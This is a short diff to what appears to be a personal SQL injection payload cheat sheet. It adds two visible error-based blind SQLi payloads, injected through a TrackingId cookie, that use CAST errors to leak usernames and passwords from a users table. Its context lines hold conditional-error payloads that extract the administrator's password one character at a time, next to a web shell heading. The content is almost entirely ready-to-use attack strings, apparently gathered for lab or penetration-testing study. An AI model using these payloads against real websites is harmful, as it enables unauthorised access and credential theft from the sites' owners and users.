@@ -235,6 +235,9 @@ TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN to_char(1/0) ELSE '' 
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+--- Blind: Visible error-based SQLi
+TrackingId='+AND+1=CAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)--
+TrackingId='+AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--
 
 // WEB SHELL
 
